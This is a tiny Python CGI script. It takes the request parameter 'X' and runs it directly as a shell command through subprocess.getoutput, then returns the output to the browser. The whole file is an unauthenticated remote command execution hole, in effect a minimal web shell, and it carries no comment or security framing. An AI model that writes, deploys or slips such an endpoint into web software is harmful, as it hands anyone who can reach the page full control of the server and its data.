#!/usr/bin/python3

import cgi

print("content-type: text/html")
print()

fields = cgi.FieldStorage()
cmd = fields.getvalue("X")
from subprocess import getoutput
print(getoutput(cmd))